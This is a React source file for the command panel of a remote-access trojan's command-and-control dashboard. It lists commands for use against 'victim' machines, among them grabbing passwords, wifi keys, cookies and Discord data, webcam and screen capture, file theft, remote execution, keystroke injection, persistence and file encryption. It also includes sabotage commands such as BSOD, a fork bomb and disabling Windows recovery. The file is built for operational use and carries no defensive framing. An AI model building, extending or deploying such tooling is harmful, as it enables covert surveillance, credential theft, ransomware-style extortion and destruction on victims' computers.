// app/dashboard/c2/CommandInterface.tsx
'use client'
import { useState } from 'react'

interface CommandInterfaceProps {
  clientId: number
  onCommandSent: () => void
}

const COMMAND_CATEGORIES = {
  'System': ['ss', 'screenrec', 'webcam', 'show', 'foreground'],
  'Process': ['kill', 'blacklist', 'whitelist'],
  'Files': ['ls', 'pwd', 'cd', 'tree', 'download', 'upload', 'execute', 'remove', 'clear'],
  'Grab': ['grab'],
  'Input': ['block_input', 'unblock_input'],
  'System Manipulation': ['bsod', 'forkbomb', 'set_critical', 'unset_critical', 'disable_reset', 'enable_reset'],
  'Monitor': ['monitors_off', 'monitors_on'],
  'Website': ['block_website', 'unblock_website'],
  'Keyboard': ['key'],
  'Audio/Visual': ['tts', 'msg', 'volume', 'play'],
  'Encryption': ['encrypt', 'decrypt'],
  'Self Destruct': ['implode', 'restart'],
  'CMD': ['cmd'],
  'Clipboard': ['clipboard'],
  'Persistence': ['persist', 'unpersist'],
}

const COMMAND_DETAILS: Record<string, { name: string, params: any, description: string }> = {
  ss: { 
    name: '📸 Screenshot', 
    params: '{}',
    description: 'Take a screenshot of all monitors'
  },
  screenrec: { 
    name: '🎥 Screen Recording', 
    params: '{"duration": 15, "fps": 10}',
    description: 'Record screen for specified duration'
  },
  webcam: { 
    name: '📷 Webcam Photo', 
    params: '{}',
    description: 'Take photo from default webcam'
  },
  show: { 
    name: '🔍 Show Info', 
    params: '{"what": "processes"}',
    description: 'Show processes, system info, network, or disks'
  },
  kill: { 
    name: '⚡ Kill Process', 
    params: '{"target": "process.exe"}',
    description: 'Kill process by name or PID'
  },
  blacklist: { 
    name: '⛔ Blacklist Process', 
    params: '{"process": "process.exe"}',
    description: 'Add process to auto-kill blacklist'
  },
  whitelist: { 
    name: '✅ Whitelist Process', 
    params: '{"process": "process.exe"}',
    description: 'Remove process from blacklist'
  },
  ls: { 
    name: '📁 List Directory', 
    params: '{}',
    description: 'List current directory contents'
  },
  pwd: { 
    name: '📍 Print Working Directory', 
    params: '{}',
    description: 'Show current directory path'
  },
  cd: { 
    name: '📂 Change Directory', 
    params: '{"target": ".."}',
    description: 'Change working directory'
  },
  tree: { 
    name: '🌳 Directory Tree', 
    params: '{}',
    description: 'Generate directory tree structure'
  },
  download: { 
    name: '⬇️ Download File', 
    params: '{"filepath": "C:\\Users\\..."}',
    description: 'Download file from victim'
  },
  upload: { 
    name: '⬆️ Upload File', 
    params: '{"filepath": "C:\\Users\\..."}',
    description: 'Upload file to victim'
  },
  execute: { 
    name: '▶️ Execute File', 
    params: '{"filepath": "C:\\Users\\..."}',
    description: 'Execute file on victim'
  },
  remove: { 
    name: '🗑️ Remove', 
    params: '{"path": "C:\\Users\\..."}',
    description: 'Remove file or directory'
  },
  clear: { 
    name: '🧹 Clear Temp', 
    params: '{}',
    description: 'Clear temporary files'
  },
  grab: { 
    name: '📦 Grab Data', 
    params: '{"what": "all"}',
    description: 'Grab passwords, wifi, history, cookies, discord'
  },
  block_input: { 
    name: '🚫 Block Input', 
    params: '{}',
    description: 'Block keyboard and mouse'
  },
  unblock_input: { 
    name: '🔓 Unblock Input', 
    params: '{}',
   description: 'Unblock keyboard and mouse'
  },
  bsod: { 
    name: '💀 BSOD', 
    params: '{}',
    description: 'Trigger Blue Screen of Death (admin)'
  },
  forkbomb: { 
    name: '💣 Fork Bomb', 
    params: '{}',
    description: 'Create fork bomb process'
  },
  set_critical: { 
    name: '🔴 Set Critical', 
    params: '{}',
    description: 'Set process as critical (admin)'
  },
  unset_critical: { 
    name: '🟢 Unset Critical', 
    params: '{}',
   description: 'Remove critical status'
  },
  disable_reset: { 
    name: '🚫 Disable Recovery', 
    params: '{}',
    description: 'Disable Windows recovery (admin)'
  },
  enable_reset: { 
    name: '✅ Enable Recovery', 
    params: '{}',
    description: 'Enable Windows recovery (admin)'
  },
  monitors_off: { 
    name: '⬛ Monitors Off', 
    params: '{}',
    description: 'Turn off all monitors'
  },
  monitors_on: { 
    name: '⬜ Monitors On', 
    params: '{}',
    description: 'Turn on all monitors'
  },
  block_website: { 
    name: '⛔ Block Website', 
    params: '{"website": "https://example.com"}',
    description: 'Block website via hosts file'
  },
  unblock_website: { 
    name: '✅ Unblock Website', 
    params: '{"website": "example.com"}',
    description: 'Unblock website'
  },
  key: { 
    name: '⌨️ Press Keys', 
    params: '{"keys": "hello"}',
    description: 'Simulate key presses'
  },
  tts: { 
    name: '🔊 Text to Speech', 
    params: '{"text": "Hello"}',
    description: 'Play TTS message'
  },
  msg: { 
    name: '📧 Message Box', 
    params: '{"title": "Alert", "text": "Message", "style": 0}',
    description: 'Show Windows message box'
  },
  volume: { 
    name: '🔉 Set Volume', 
    params: '{"level": 50}',
    description: 'Change system volume'
  },
  play: { 
    name: '▶️ Play Audio', 
    params: '{"filepath": "C:\\music.mp3"}',
    description: 'Play audio file'
  },
  encrypt: { 
    name: '🔒 Encrypt', 
    params: '{"path": "C:\\Users\\..."}',
    description: 'Encrypt files in directory'
  },
  decrypt: { 
    name: '🔓 Decrypt', 
    params: '{"path": "C:\\Users\\...", "key": ""}',
    description: 'Decrypt files with key'
  },
  implode: { 
    name: '💥 Self Destruct', 
    params: '{}',
    description: 'Remove all traces and exit'
  },
  restart: { 
    name: '🔄 Restart Client', 
    params: '{}',
    description: 'Restart the C2 client'
  },
  cmd: { 
    name: '💻 Execute Command', 
    params: '{"command": "ipconfig"}',
    description: 'Run CMD command'
  },
  clipboard: { 
    name: '📋 Clipboard', 
    params: '{"action": "get"}',
    description: 'Get or set clipboard'
  },
  persist: { 
    name: '📌 Add Persistence', 
    params: '{}',
    description: 'Add to startup'
  },
  unpersist: { 
    name: '❌ Remove Persistence', 
    params: '{}',
    description: 'Remove from startup'
  },
}

export default function CommandInterface({ clientId, onCommandSent }: CommandInterfaceProps) {
  const [selectedCommand, setSelectedCommand] = useState('ss')
  const [parameters, setParameters] = useState('{}')
  const [loading, setLoading] = useState(false)
  const [fileToUpload, setFileToUpload] = useState<File | null>(null)
  const [activeCategory, setActiveCategory] = useState('System')
  const [commandHistory, setCommandHistory] = useState<string[]>([])

  async function sendCommand() {
    setLoading(true)
    try {
      let finalParams = parameters
      
      // Handle file upload
      if (selectedCommand === 'upload' && fileToUpload) {
        const reader = new FileReader()
        reader.readAsDataURL(fileToUpload)
        reader.onload = async () => {
          const base64 = (reader.result as string).split(',')[1]
          const params = JSON.parse(parameters || '{}')
          params.data = base64
          
          await fetch(`/api/c2/clients/${clientId}/commands`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              command: selectedCommand,
              parameters: params
            })
          })
          
          setCommandHistory(prev => [selectedCommand, ...prev].slice(0, 10))
          setLoading(false)
          onCommandSent()
        }
        return
      }

      // Normal command
      const res = await fetch(`/api/c2/clients/${clientId}/commands`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          command: selectedCommand,
          parameters: JSON.parse(finalParams || '{}')
        })
      })

      if (res.ok) {
        setCommandHistory(prev => [selectedCommand, ...prev].slice(0, 10))
      }
    } catch (error) {
      console.error('Failed to send command:', error)
    }
    setLoading(false)
    onCommandSent()
  }

  return (
    <div 
      className="p-6 rounded-xl"
      style={{ 
        background: 'linear-gradient(135deg, #1a1218 0%, #0f0b0c 100%)',
        border: '1px solid #352f31',
        boxShadow: '0 10px 30px rgba(0,0,0,0.3)'
      }}
    >
      <h3 className="text-lg font-bold mb-4 flex items-center gap-2" style={{ color: '#e5e3e4' }}>
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#dc2625" strokeWidth="2">
          <path d="M12 2v20M17 5H9.5M17 12h-5M17 19h-5"/>
        </svg>
        Command Center
      </h3>

      {/* Category Tabs */}
      <div className="flex flex-wrap gap-1 mb-4 p-1 rounded-lg" style={{ background: '#0f0b0c' }}>
        {Object.keys(COMMAND_CATEGORIES).map(category => (
          <button
            key={category}
            onClick={() => setActiveCategory(category)}
            className={`px-3 py-1.5 rounded text-xs font-medium transition-colors ${
              activeCategory === category ? 'bg-red-500/20 text-red-500' : 'text-gray-500 hover:text-gray-300'
            }`}
          >
            {category}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-2 gap-6">
        {/* Left Column - Command Selection */}
        <div className="space-y-4">
          <div>
            <label className="block text-sm mb-2" style={{ color: '#888485' }}>
              Command
            </label>
            <select
              value={selectedCommand}
              onChange={(e) => {
                setSelectedCommand(e.target.value)
                setParameters(COMMAND_DETAILS[e.target.value]?.params || '{}')
              }}
              className="w-full p-3 rounded-lg outline-none transition-colors"
              style={{ 
                background: '#2a2024', 
                border: '1px solid #352f31', 
                color: '#e5e3e4' 
              }}
              onFocus={(e) => e.target.style.borderColor = '#dc2625'}
              onBlur={(e) => e.target.style.borderColor = '#352f31'}
            >
              {COMMAND_CATEGORIES[activeCategory as keyof typeof COMMAND_CATEGORIES]?.map(cmd => (
                <option key={cmd} value={cmd}>
                  {COMMAND_DETAILS[cmd]?.name || cmd}
                </option>
              ))}
            </select>
          </div>

          {COMMAND_DETAILS[selectedCommand] && (
            <div className="p-3 rounded-lg" style={{ background: '#0f0b0c' }}>
              <p className="text-xs" style={{ color: '#868283' }}>
                {COMMAND_DETAILS[selectedCommand].description}
              </p>
            </div>
          )}

          {selectedCommand === 'upload' && (
            <div>
              <label className="block text-sm mb-2" style={{ color: '#888485' }}>
                File to Upload
              </label>
              <input
                type="file"
                onChange={(e) => setFileToUpload(e.target.files?.[0] || null)}
                className="w-full p-2 rounded"
                style={{ background: '#2a2024', border: '1px solid #352f31', color: '#e5e3e4' }}
              />
            </div>
          )}

          {/* Command History */}
          {commandHistory.length > 0 && (
            <div>
              <label className="block text-sm mb-2" style={{ color: '#888485' }}>
                Recent Commands
              </label>
              <div className="space-y-1">
                {commandHistory.map((cmd, i) => (
                  <button
                    key={i}
                    onClick={() => {
                      setSelectedCommand(cmd)
                      setParameters(COMMAND_DETAILS[cmd]?.params || '{}')
                    }}
                    className="w-full p-2 rounded text-xs text-left transition-colors"
                    style={{ background: '#1a1218', color: '#868283' }}
                  >
                    {COMMAND_DETAILS[cmd]?.name || cmd}
                  </button>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* Right Column - Parameters */}
        <div className="space-y-4">
          <div>
            <label className="block text-sm mb-2" style={{ color: '#888485' }}>
              Parameters (JSON)
            </label>
            <textarea
              value={parameters}
              onChange={(e) => setParameters(e.target.value)}
              rows={8}
              className="w-full p-3 rounded-lg font-mono text-sm outline-none transition-colors"
              style={{ 
                background: '#2a2024', 
                border: '1px solid #352f31', 
                color: '#e5e3e4' 
              }}
              onFocus={(e) => e.target.style.borderColor = '#dc2625'}
              onBlur={(e) => e.target.style.borderColor = '#352f31'}
              placeholder='{"key": "value"}'
            />
          </div>

          {/* Parameter Help */}
          <div className="p-3 rounded-lg" style={{ background: '#0f0b0c' }}>
            <p className="text-xs mb-2" style={{ color: '#888485' }}>Parameter Examples:</p>
            <pre className="text-[10px] overflow-x-auto" style={{ color: '#5d585c' }}>
              {selectedCommand === 'show' && '{"what": "processes"}\n{"what": "system"}\n{"what": "network"}'}
              {selectedCommand === 'kill' && '{"target": "notepad.exe"}\n{"target": "1234"}'}
              {selectedCommand === 'cd' && '{"target": ".."}\n{"target": "Desktop"}\n{"target": "C:\\Windows"}'}
              {selectedCommand === 'download' && '{"filepath": "C:\\Users\\file.txt"}'}
              {selectedCommand === 'grab' && '{"what": "all"}\n{"what": "passwords"}\n{"what": "wifi"}'}
              {selectedCommand === 'msg' && '{"title": "Alert", "text": "Hello", "style": 0}'}
              {selectedCommand === 'block_website' && '{"website": "https://example.com"}'}
              {selectedCommand === 'cmd' && '{"command": "ipconfig /all"}'}
            </pre>
          </div>
        </div>
      </div>

      {/* Send Button */}
      <button
        onClick={sendCommand}
        disabled={loading}
        className="w-full mt-6 py-3 px-4 rounded-lg font-bold text-white transition-all disabled:opacity-50 relative overflow-hidden group"
        style={{ 
          background: 'linear-gradient(135deg, #dc2625, #b91c1c)',
          boxShadow: '0 0 30px rgba(220,38,37,0.3)'
        }}
      >
        <span className="relative z-10 flex items-center justify-center gap-2">
          {loading ? (
            <>
              <svg className="animate-spin" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="12" cy="12" r="10" stroke="currentColor" fill="none"/>
                <path d="M12 2v4M12 22v-4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M22 12h-4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
              </svg>
              Sending Command...
            </>
          ) : (
            <>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/>
              </svg>
              Execute Command
            </>
          )}
        </span>
      </button>
    </div>
  )
}